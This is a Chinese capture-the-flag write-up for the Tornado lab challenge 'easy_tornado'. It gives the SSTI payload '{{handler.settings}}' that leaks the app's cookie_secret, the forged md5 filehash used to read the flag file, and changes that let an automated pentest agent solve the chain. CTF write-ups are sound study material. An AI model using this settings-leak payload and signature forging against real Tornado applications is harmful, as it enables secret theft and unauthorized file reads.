# DASCTF / [护网杯 2018]easy_tornado filehash + SSTI 做题 WP

> 日期：2026-06-09  
> 平台：DASCTF practice / BUUCTF 公开练习  
> 题目：`[护网杯 2018]easy_tornado`  
> 类型：Web / Tornado SSTI / signed file read  
> 最终 flag：`DASCTF{a5f0ac5e-6e7a-47e6-8f58-0ffd207b3e7a}`  
> 本次目标：用实靶检验 FlagHunter 对 `filename + filehash`、提示文件、Tornado `cookie_secret` 泄露和签名重建链的自动化能力。

---

## 1. 环境与入口

使用 OpenCLI Browser Bridge 复用登录态，在 BUUCTF Web 分类中启动：

```text
[护网杯 2018]easy_tornado
```

靶场地址：

```text
http://ab237156b2cb8b5d8e3a648a.http-ctf2.dasctf.com:80
```

约束：

- 不截图。
- 不导出大体积响应。
- 只做少量 HTTP 请求，不做大规模扫描。

---

## 2. 首页线索

首页直接给出三个带签名的文件读取链接：

```html
<a href="/file?filename=/flag.txt&filehash=8f3944a6ff9c64f0678830d398ff5d9f">/flag.txt</a>
<a href="/file?filename=/welcome.txt&filehash=3903afbae91b30f47e35c2610cd760f2">/welcome.txt</a>
<a href="/file?filename=/hints.txt&filehash=5401895f8dae905216d71a39140ec036">/hints.txt</a>
```

这说明主线应优先走 `filehash` 签名文件读取，而不是先进行泛化扫描。

---

## 3. 提示文件

访问 `/welcome.txt`：

```text
/welcome.txt<br>render
```

访问 `/hints.txt`：

```text
/hints.txt<br>md5(cookie_secret+md5(filename))
```

访问 `/flag.txt`：

```text
/flag.txt<br>flag in /fllllllllllllag
```

因此真实 flag 文件名是：

```text
/fllllllllllllag
```

签名公式是：

```text
filehash = md5(cookie_secret + md5(filename))
```

---

## 4. 泄露 cookie_secret

通用 SSTI probe：

```text
/error?msg={{7*7}}
```

返回：

```text
ORZ
```

但 Tornado 专属 payload 可用：

```text
/error?msg={{handler.settings}}
```

响应中泄露：

```text
'cookie_secret': '4f3b7a86-5db4-43ac-bfa6-b10f4e12f32b'
```

---

## 5. 计算签名并读取 flag

本地计算：

```text
filename = /fllllllllllllag
md5(filename) = 3bf9f6cf685a6dd8defadabfb41a03a1
filehash = md5(cookie_secret + md5(filename))
filehash = c91635b116a902a0e5eb7ee8408d0010
```

请求：

```text
/file?filename=%2Ffllllllllllllag&filehash=c91635b116a902a0e5eb7ee8408d0010
```

得到：

```text
/fllllllllllllag<br>DASCTF{a5f0ac5e-6e7a-47e6-8f58-0ffd207b3e7a}
```

---

## 6. FlagHunter 初始表现

修复前端到端运行：

```powershell
.\.venv\Scripts\pentestagent run -t "http://ab237156b2cb8b5d8e3a648a.http-ctf2.dasctf.com:80" --mode ctf --max-loops 6 "拿到flag。优先少量HTTP侦察、Tornado模板错误线索和签名文件读取，不要大规模扫描。"
```

失败表现：

```text
detected_type=web
ssti probe: render surface returned uniform responses with no '49'
当前表面已耗尽，不再重复同一 payload
```

项目不足：

1. 首页已经出现 `filename + filehash` 强链路，但 dispatcher 仍会被泛化 `ssti_probe` 的 `{{7*7}}` 失败带偏。
2. `hash_guarded_file_read` 只尝试在 `filename` 参数里注入 cookie_secret payload。
3. 实靶可用面是 `/error?msg={{handler.settings}}`，而不是 `filename={{...}}`。
4. `{{handler.settings["cookie_secret"]}}` 和 `{{7*7}}` 均可能被拦截，`{{handler.settings}}` 反而能泄露完整 settings dict。

---

## 7. 项目改造记录

文件：

```text
pentestagent/agents/pa_agent/ctf_dispatcher.py
tests/unit/agents/test_ctf_dispatcher.py
```

修复点：

- `hash_guarded_file_read` 的 SSTI payload 增加 `{{handler.settings}}`。
- 除 `filename` 注入外，同时使用 `_collect_render_surface_urls()` 收集 `/error?msg=...` 这类 render surface。
- 对 render surface 使用 `_inject_render_payload()` 进行定向 cookie_secret 探测。
- 如果 filename probe 发生 redirect 到 `/error?msg=Error`，会对 final render URL 追加一次同 payload replay。
- 新增端到端模拟回归：

```text
test_ctf_dispatcher_solves_easy_tornado_handler_settings_hash_chain
```

---

## 8. 验证记录

新增回归：

```powershell
.\.venv\Scripts\pytest tests\unit\agents\test_ctf_dispatcher.py -k "easy_tornado_handler_settings" -vv
```

结果：

```text
1 passed
```

相关回归：

```powershell
.\.venv\Scripts\pytest tests\unit\agents\test_ctf_dispatcher.py -k "easy_tornado_handler_settings or p7_ssti or p7_hash or hash_guarded or file_read or warmup"
```

结果：

```text
19 passed
```

活靶端到端复测：

```powershell
.\.venv\Scripts\pentestagent run -t "http://ab237156b2cb8b5d8e3a648a.http-ctf2.dasctf.com:80" --mode ctf --max-loops 6 "拿到flag。优先少量HTTP侦察、Tornado模板错误线索和签名文件读取，不要大规模扫描。"
```

结果：

```text
Flag verified: DASCTF{a5f0ac5e-6e7a-47e6-8f58-0ffd207b3e7a}
Duration: 0m 24s
```

---

## 9. 可复用经验

这道题沉淀出的通用规则：

1. 当首页已给 `filename + filehash`，优先消费提示文件和签名重建链，不要被泛化 SSTI probe 的失败提前终止。
2. Tornado 题里 `{{7*7}}` 被拦截不代表不存在模板注入，应尝试 `{{handler.settings}}` 这种引擎专属低噪声 probe。
3. `filename` 参数不能执行模板时，要利用 redirect / 页面提示里的 render surface，例如 `/error?msg=...`。
